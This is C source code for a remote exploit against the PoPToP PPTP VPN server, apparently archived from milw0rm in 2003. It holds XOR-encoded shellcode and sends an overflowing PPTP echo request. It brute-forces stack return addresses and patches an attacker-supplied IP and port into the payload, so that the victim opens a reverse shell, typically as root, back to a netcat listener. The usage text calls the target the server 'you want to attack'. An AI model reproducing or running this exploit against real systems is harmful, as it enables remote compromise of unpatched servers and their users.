/* 
*  exploit for a recently discovered vulnerability in PoPToP
*  PPTP server under Linux. Versions affected are all prior to
*  1.1.4-b3 and 1.1.3-20030409.
*  The exploit is capable of bruteforcing the RET address to find our
*  buffer in the stack. Upon a successfull run it brings up a reverse
*  shell with privileges of the pptpd daemon (typically root)
*  on the victim server.
*/

#include <iostream.h>
#include <winsock.h>
#include <stdio.h>

#define u_int8_t char
#define u_int16_t WORD
#define u_int32_t DWORD


char shellcode[] =

"\x1a\x76\xa2\x41\x21\xf5\x1a\x43\xa2\x5a\x1a\x58\xd0\x1a\xce\x6b"
"\xd0\x1a\xce\x67\xd8\x1a\xde\x6f\x1e\xde\x67\x5e\x13\xa2\x5a\x1a"
"\xd6\x67\xd0\xf5\x1a\xce\x7f\xf5\x54\xd6\x7d"

"\x01\x01" // port

"\x54\xd6\x63"

"\x01\x01\x01\x01" // ip address

"\x1e\xd6\x7f\x1a\xd6\x6b\x55\xd6\x6f\x83\x1a\x43\xd0\x1e\xde\x67"
"\x5e\x13\xa2\x5a\x03\x18\xce\x67\xa2\x53\xbe\x52\x6c\x6c\x6c\x5e"
"\x13\xd2\xa2\x41\x12\x79\x6e\x6c\x6c\x6c\xaa\x42\xe6\x79\x78\x8b"
"\xcd\x1a\xe6\x9b\xa2\x53\x1b\xd5\x94\x1a\xd6\x9f\x23\x98\x1a\x60"
"\x1e\xde\x9b\x1e\xc6\x9f\x5e\x13\x7b\x70\x6c\x6c\x6c\xbc\xf1\xfa"
"\xfd\xbc\xe0\xfb";




struct pptp_header {
        u_int16_t length;               /* pptp message length incl header */
        u_int16_t pptp_type;            /* pptp message type */
        u_int32_t magic;                /* magic cookie */
        u_int16_t ctrl_type;            /* control message type */
        u_int16_t reserved0;            /* reserved */
};

#define MAX_HOSTNAME_SIZE               64
#define MAX_VENDOR_SIZE                 64
#define PPTP_VERSION                    0x0100

struct pptp_start_ctrl_conn_rqst {
        struct pptp_header header;      /* pptp header */
        u_int16_t version;              /* pptp protocol version */
        u_int16_t reserved1;            /* reserved */
        u_int32_t framing_cap;          /* framing capabilities */
        u_int32_t bearer_cap;           /* bearer capabilities */
        u_int16_t max_channels;         /* maximum channels */
        u_int16_t firmware_rev;         /* firmware revision */
        u_int8_t hostname[MAX_HOSTNAME_SIZE];   /* hostname */
        u_int8_t vendor[MAX_VENDOR_SIZE];       /* vendor */
};

struct pptp_echo_rqst {
        struct pptp_header header;      /* header */
        u_int32_t identifier;           /* value to match rply with rqst */
                                char buf[10000];
};

struct pptp_reply {
        struct pptp_header header;      /* header */
                                char buf[10000];
};


/* Magic Cookie */
#define PPTP_MAGIC_COOKIE               0x1a2b3c4d

/* Message types */
#define PPTP_CTRL_MESSAGE               1

/* Control Connection Management */
#define START_CTRL_CONN_RQST            1
#define START_CTRL_CONN_RPLY            2
#define STOP_CTRL_CONN_RQST             3
#define STOP_CTRL_CONN_RPLY             4
#define ECHO_RQST                       5
#define ECHO_RPLY                       6

// brute force values
#define TOPOFSTACK 0xbfffffff
#define BOTTOMOFSTACK 0xbf000000
#define STEP 50

void send_init_request(SOCKET st)
{
        pptp_start_ctrl_conn_rqst request;
  request.header.magic = htonl(PPTP_MAGIC_COOKIE);
  request.header.pptp_type = htons(PPTP_CTRL_MESSAGE);
        request.header.ctrl_type = htons(START_CTRL_CONN_RQST);

  request.version = PPTP_VERSION;
        request.framing_cap = 0;
        request.bearer_cap = 0;
        request.max_channels = 1;
        request.firmware_rev = 0;
  strcpy(request.hostname,"hell");
        strcpy(request.vendor,"domain HELL");
  request.header.length = ntohs(sizeof(request));

        send(st,(char*)&request,sizeof(request),0);

}

void send_ping_overflow(SOCKET st,DWORD ret,char* hostname,short port)
{ 
  pptp_echo_rqst ping;
        ping.header.magic = htonl(PPTP_MAGIC_COOKIE);
  ping.header.pptp_type = htons(PPTP_CTRL_MESSAGE);
        ping.header.ctrl_type = htons(ECHO_RQST);
        ping.identifier = 111;

        ping.header.length = ntohs(1);
        
  
        strcpy(ping.buf,"");
        
        int buflen = 500;
        for (int i=0;i<buflen;i++)strcat(ping.buf,"\x90");      
        memcpy(ping.buf+364,(char*)&ret,4); 

        // patch shellcode
        // we have a shellcode xored by 0x93.. let's unxor it :)
        for (i=0;i<sizeof(shellcode);i++) shellcode[i] ^= 0x93;

        *(unsigned short int*)(shellcode+43) = htons(port);
        
  *(unsigned long int*)(shellcode+48) = inet_addr(hostname);

        // we leave 100 bytes for NOPs
        memcpy(ping.buf+100,shellcode,sizeof(shellcode));
                
        send(st,(char*)&ping,sizeof(ping.header)+buflen,0);
 
}

SOCKET st;

int connect_server(char* hostname)
{
        st=socket(PF_INET,SOCK_STREAM,0);
        if (st==INVALID_SOCKET) return 0;

        sockaddr_in addr;

        addr.sin_family=AF_INET;
        addr.sin_port=0;
        addr.sin_addr.s_addr=0;
        bind(st, (LPSOCKADDR)&addr,sizeof(addr));
  
        
        addr.sin_family=AF_INET;
        addr.sin_port=htons(1723);
        addr.sin_addr.s_addr=inet_addr(hostname);
        printf("connecting... ");
        if (connect(st,(sockaddr*)&addr,sizeof(addr)) != 0)
        {
                printf("Connect error. GetLastError=%d\n",GetLastError());
                return 0;
        }
        return 1;
}

int main(int argc, char** argv)
{
        printf("\n");
        printf("                   D  H     H                            \n");
        printf("                   D  H     H     T\n");
        printf("                   D  H  H  H     T     EE    AA   M   M \n");
        printf("               DDD D  HHHHHHH     T    E  E  A  A  MM MM \n");
        printf("              D   DD  H  H  H    TTTT  E  E  A  A  MM MM \n");
        printf("             D     D  H     H     T    EEE   AAAA  M M M \n");
        printf("              D    D  H     H     T    E     A  A  M   M \n");
        printf("               DDDD   H     H      TTT  EEE  A  A  M   M   ");
        printf(" ... presents ... \n\n");
  printf("Exploit for PoPToP PPTP server older than \n1.1.4-b3 and 1.1.3-20030409 under Linux.\n");
        printf("by .einstein., April 2003.\n");
        printf("\n");
  if (argc < 2)
  {
                printf("usage: \n");
                printf("  %s <pptp_server> [<your_ip>] [<your_port>] [<timeout>]\n\n",argv[0]);
                printf("    <pptp_server> is the ip address or hostname of the PoPToP server\n");
                printf("      you want to attack.  Port 1723 is used for connection\n");
                printf("    <your_ip> and <your_port> - specify an ip address to which\n");
                printf("      a connection is possible to port <your_port> and set up a\n");
                printf("      netcat listener. You'll get a reverse shell.\n");
                printf("    <timeout> is a delay between stack bruteforce attemts, in milliseconds\n");
                printf("   If you only pass a single parameter, the program will check\n");
                printf("   whether remote server is vulnerable or not. Otherwise it will\n");
                printf("   perform a ret bruteforce.\n");
                printf("usage examples:\n");
                printf("  %s 192.168.1.2 192.168.1.1 5555\n",argv[0]);
                printf("    attack 192.168.1.2 and get a reverse shell on port 5555\n");
          printf("  %s 127.0.0.1 127.0.0.1 6666 100\n",argv[0]);
                printf("    attack a locally running pptpd with a timeout of 100 ms\n");
                printf("    and get a shell on port 6666.\n");
                printf("  %s 192.168.1.56\n",argv[0]);
                printf("    check if the PoPToP server on 192.168.1.56 is vulnerable.\n");
    return 0;
        }


  int timeout = 500;
  if (argc >= 5) timeout = atoi(argv[4]);

        // init winsock
        WORD version=0x0101;
  WSADATA data;
  WSAStartup(version,&data);

        DWORD ret;
        if (argc == 2)
        {
                if (!connect_server(argv[1])) return 1;

                printf("\nChecking if the server is vulnerable..\n");
                printf("(if it is you have to wait 65 seconds)..\n");
                send_init_request(st);

                ret = 0x01010101;
                int bytes;
                pptp_reply reply;
                        
                //header length
                bytes = recv(st,(char*)&reply,2,0);
                bytes = ntohs(reply.header.length);
                bytes = recv(st,(char*)&reply+2,bytes-2,0);
                int j = htons(reply.header.ctrl_type);
                send_ping_overflow(st,ret,"0.0.0.0",0);
                        
                //header length
                bytes = recv(st,(char*)&reply,2,0);
                printf("PoPToP server is ");
                if (bytes != SOCKET_ERROR) printf("vulnerable!\n");
                else printf("not vulnerable\n");
                closesocket(st);

                return 1;
        }

        printf("[!] Attempting bruteforce against %s\n",argv[1]);
        printf("interrupt when you get a shell to %s on port %d...\n\n",argv[2],atoi(argv[3]));
        
        int checked = 0;
        
        for (ret = TOPOFSTACK; ret >=BOTTOMOFSTACK; ret -= STEP)
        {
          printf("[*] ");
                if (!connect_server(argv[1])) return 1;
        printf("[ret=0x%x]..",ret);
        printf("sending payload..");
        
                // initial packet
                send_init_request(st);

                //a real overflowing ping packet
          send_ping_overflow(st,ret,argv[2],atoi(argv[3]));
                closesocket(st);

                Sleep(timeout);
                printf("done\n");
        
                
        
        }
        
        return 0;
}


// milw0rm.com [2003-04-18]
